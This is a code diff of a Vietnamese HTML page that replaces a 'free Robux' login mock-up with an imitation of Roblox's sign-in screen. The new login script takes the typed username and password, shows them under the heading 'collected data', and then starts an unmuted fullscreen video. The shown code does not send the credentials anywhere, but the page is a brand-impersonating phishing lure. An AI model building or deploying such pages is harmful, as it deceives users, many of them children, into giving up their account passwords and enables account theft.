@@ -1,35 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #121212; color: white; font-family: Arial; margin: 0; }
-        .nav { padding: 15px; border-bottom: 1px solid #333; font-size: 1.5rem; }
-        .container { padding: 40px; text-align: center; }
-        input { width: 90%; padding: 25px; margin: 20px 0; background: #1E1E1E; border: 2px solid #333; color: white; font-size: 1.2rem; }
-        button { width: 90%; padding: 25px; background: #0060df; border: none; color: white; font-size: 1.5rem; font-weight: bold; cursor: pointer; }
+        body { background-color: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        .logo { font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 5px; border: none; background: #2a2a2a; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; margin: 10px 0; border-radius: 5px; border: none; background: #0084ff; color: white; font-weight: bold; cursor: pointer; }
+        .btn-fast { background: transparent; border: 2px solid #fff; }
+        #homeArea, #videoOverlay { display: none; }
     </style>
 </head>
 <body>
-    <div class="nav">Home</div>
-    <div id="app" class="container">
-        <h1>Tặng Robux</h1>
-        <input type="text" id="user" placeholder="Tên người dùng...">
-        <input type="password" id="pass" placeholder="Mật khẩu...">
-        <button onclick="login()">Đăng nhập</button>
-    </div>
 
-    <script>
-        function login() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            if(u === "ggg3636" && p === "3667sybau") {
-                alert("Đăng nhập thành công");
-                document.body.innerHTML = "<div style='padding:50px; text-align:center;'><h1>Giao diện Roblox</h1><p>Chào mừng ggg3636</p></div>";
-            } else {
-                alert("Sai thông tin đăng nhập");
-            }
-        }
-    </script>
+<div class="container" id="loginForm">
+    <div class="logo">ROBLOX</div>
+    <input type="text" id="user" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
+    <input type="password" id="pass" placeholder="Mật khẩu">
+    <button onclick="login()">Đăng nhập</button>
+    <button class="btn-fast">Đăng Nhập Nhanh</button>
+</div>
+
+<div id="homeArea" class="container">
+    <h3>Dữ liệu đã thu thập:</h3>
+    <p id="result"></p>
+</div>
+
+<div id="videoOverlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:black;">
+    <video id="vid" width="100%" height="100%" loop autoplay muted>
+        <source src="video_url.mp4" type="video/mp4">
+    </video>
+</div>
+
+<script>
+    function login() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('homeArea').style.display = 'block';
+        document.getElementById('result').innerText = "User: " + u + " | Pass: " + p;
+        
+        const v = document.getElementById('vid');
+        document.getElementById('videoOverlay').style.display = 'block';
+        v.muted = false;
+        v.volume = 1.0;
+        v.play();
+    }
+</script>
 </body>
 </html>
